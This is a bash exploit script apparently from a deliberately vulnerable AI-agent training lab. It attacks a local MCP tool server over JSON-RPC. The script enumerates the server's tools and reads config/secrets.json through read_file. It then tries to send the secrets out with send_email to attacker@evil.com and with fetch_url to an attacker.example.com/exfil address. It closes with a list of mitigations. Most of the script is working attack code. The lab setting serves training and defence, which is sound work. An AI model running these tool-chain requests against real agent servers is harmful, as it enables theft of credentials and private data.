#!/bin/bash
# =============================================================================
# DVAA Exploit: Tool Chain Exfiltration
# Attack Class: Tool MITM / Chained Exploitation
# Target: ToolBot MCP Server (port 3010) - JSON-RPC 2.0
# Difficulty: Advanced
#
# Description:
#   Chains multiple MCP tools together to read sensitive data and then
#   exfiltrate it via an outbound channel (email, webhook, etc).
#   This demonstrates how tool-use agents without proper authorization
#   boundaries can be weaponized for data theft.
# =============================================================================

set -euo pipefail

TARGET="http://localhost:3010/"

echo "=== Tool Chain Exfiltration ==="
echo "Target: ToolBot MCP (port 3010)"
echo ""

# Verify target is running
response=$(curl -s -w "\n%{http_code}" "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":0}' 2>/dev/null) || {
  echo "[ERROR] DVAA MCP server not running."
  echo "Start with: docker compose up -d"
  echo "Or: docker run -p 3000-3008:3000-3008 -p 3010-3013:3010-3013 -p 3020-3021:3020-3021 -p 9000:9000 opena2a/dvaa"
  exit 1
}

http_code=$(echo "$response" | tail -1)
if [ "$http_code" != "200" ]; then
  echo "[ERROR] Got HTTP $http_code from ToolBot MCP. Is DVAA running on port 3010?"
  exit 1
fi

# Step 1: Enumerate available tools
echo "[Step 1] Enumerating available MCP tools..."
body=$(echo "$response" | sed '$d')
echo "$body" | python3 -c "
import sys, json
r = json.load(sys.stdin)
tools = r.get('result', {}).get('tools', [])
for t in tools:
    print(f\"  - {t.get('name', '?')}: {t.get('description', 'no description')[:80]}\")
if not tools:
    print('  (no tools found or unexpected format)')
    print(f'  Raw: {json.dumps(r)[:200]}')
" 2>/dev/null || echo "  (could not parse tool list)"
echo ""

# Step 2: Read sensitive file
echo "[Step 2] Reading sensitive file via read_file tool..."
curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {"path": "config/secrets.json"}
    },
    "id": 1
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
result = r.get('result', r.get('error', r))
print(f'  Result: {json.dumps(result, indent=2)[:500]}')
" 2>/dev/null || echo "  (could not parse response)"
echo ""

# Step 3: Attempt exfiltration via send_email tool
echo "[Step 3] Attempting data exfiltration via send_email tool..."
curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "send_email",
      "arguments": {
        "to": "attacker@evil.com",
        "subject": "Exfiltrated Data",
        "body": "Contents of secrets.json attached"
      }
    },
    "id": 2
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
result = r.get('result', r.get('error', r))
print(f'  Result: {json.dumps(result, indent=2)[:500]}')
" 2>/dev/null || echo "  (could not parse response)"
echo ""

# Step 4: Alternative exfiltration via HTTP callback
echo "[Step 4] Attempting exfiltration via HTTP callback (fetch_url)..."
curl -s "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "fetch_url",
      "arguments": {
        "url": "https://attacker.example.com/exfil?data=STOLEN_SECRETS_HERE"
      }
    },
    "id": 3
  }' | python3 -c "
import sys, json
r = json.load(sys.stdin)
result = r.get('result', r.get('error', r))
print(f'  Result: {json.dumps(result, indent=2)[:500]}')
" 2>/dev/null || echo "  (could not parse response)"
echo ""

echo "---"
echo "Attack chain summary:"
echo "  1. Enumerate tools -> find read + send capabilities"
echo "  2. Read sensitive files (no path restriction)"
echo "  3. Exfiltrate via email, HTTP callback, or file write"
echo ""
echo "Mitigations:"
echo "  - Tool-level authorization (read vs write vs send)"
echo "  - Output filtering on sensitive patterns (keys, PII)"
echo "  - Network egress controls on agent containers"
echo "  - Human-in-the-loop approval for send/write operations"
